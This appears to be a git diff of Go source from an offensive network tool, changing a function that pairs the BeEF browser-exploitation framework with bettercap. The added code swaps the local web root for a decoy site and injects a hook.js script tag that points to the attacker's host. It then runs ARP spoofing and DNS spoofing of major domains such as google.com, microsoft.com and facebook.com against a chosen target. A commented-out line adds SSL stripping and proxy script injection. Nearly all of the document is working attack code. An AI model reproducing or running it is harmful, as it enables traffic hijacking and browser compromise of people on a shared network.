@@ -220,8 +220,19 @@ func BeefBettercap(userTarget string) {
                 userLhost = userLhostIp
             }
             //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.africana/certs/africana-cert.pem; set https.proxy.key /root/.africana/certs/africana-key.pem; set arp.spoof.targets %s; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userTarget, userLhost); fmt.Println()
-            fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.com, *microsoft.com, microsoft.com, *bing.com, bing.com, *.google.com, google.com, *duckduckgo.com, duckduckgo.com, *youtube.com, youtube.com, *yahoo.com, yahoo.com, *amazon.com, amazon.com, *facebook.com, facebook.com, *reddit.com, reddit.com, gstatic.com, *.gstatic.com, *qq.com, qq.com; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface, userTarget); fmt.Println()
-            subprocess.Popen(`systemctl stop beef-xss.service; systemctl --no-pager status beef-xss`)
+            fileXPath := "/var/www/html/.userFiles"
+            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
+                subprocess.Popen(`mkdir -p /var/www/html/.userFiles/; mv /var/www/html/* /var/www/html/.userFiles/; cp -r /root/.africana/africana-base/africana-site/* /var/www/html/`)
+                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, userLhost)
+                filesToReplacements := map[string]map[string]string{
+                    "/var/www/html/index.html": {
+                        `africana-beef`: newString,
+                    },
+                }
+            utils.Editors(filesToReplacements)
+            }
+            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.com, *microsoft.com, microsoft.com, *bing.com, bing.com, *.google.com, google.com, *duckduckgo.com, duckduckgo.com, *youtube.com, youtube.com, *yahoo.com, yahoo.com, *amazon.com, amazon.com, *facebook.com, facebook.com, *reddit.com, reddit.com, gstatic.com, *.gstatic.com, *qq.com, qq.com; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface, userTarget); fmt.Println()
+            subprocess.Popen(`systemctl stop apache2.service beef-xss.service; rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; systemctl --no-pager status apache2.service beef-xss.service`)
     case "2":
         if _, err := exec.LookPath("beef-xss"); err != nil {
             fmt.Printf("\n%sBeef isn't installed, install it with 'sudo apt install beef-xss'%s\n", bcolors.RED, bcolors.ENDC)
@@ -270,8 +281,19 @@ func BeefBettercap(userTarget string) {
                 userLhost = userLhostIp
             }
             //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.africana/certs/africana-cert.pem; set https.proxy.key /root/.africana/certs/africana-key.pem; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userLhost); fmt.Println()
-            fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains  *.com, *microsoft.com, microsoft.com, *bing.com, bing.com, *.google.com, google.com, *duckduckgo.com, duckduckgo.com, *youtube.com, youtube.com, *yahoo.com, yahoo.com, *amazon.com, amazon.com, *facebook.com, facebook.com, *reddit.com, reddit.com, gstatic.com, *.gstatic.com, *qq.com, qq.com; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface); fmt.Println()
-            subprocess.Popen(`systemctl stop beef-xss.service; systemctl --no-pager status beef-xss`)
+            fileXPath := "/var/www/html/.userFiles"
+            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
+                subprocess.Popen(`mkdir -p /var/www/html/.userFiles/; mv /var/www/html/* /var/www/html/.userFiles/; cp -r /root/.africana/africana-base/africana-site/* /var/www/html/`)
+                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, userLhost)
+                filesToReplacements := map[string]map[string]string{
+                    "/var/www/html/index.html": {
+                        `africana-beef`: newString,
+                    },
+                }
+            utils.Editors(filesToReplacements)
+            }
+            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains  *.com, *microsoft.com, microsoft.com, *bing.com, bing.com, *.google.com, google.com, *duckduckgo.com, duckduckgo.com, *youtube.com, youtube.com, *yahoo.com, yahoo.com, *amazon.com, amazon.com, *facebook.com, facebook.com, *reddit.com, reddit.com, gstatic.com, *.gstatic.com, *qq.com, qq.com; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface); fmt.Println()
+            subprocess.Popen(`systemctl stop apache2.service beef-xss.service; rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; systemctl --no-pager status apache2.service beef-xss.service`)
     default:
         fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
     }
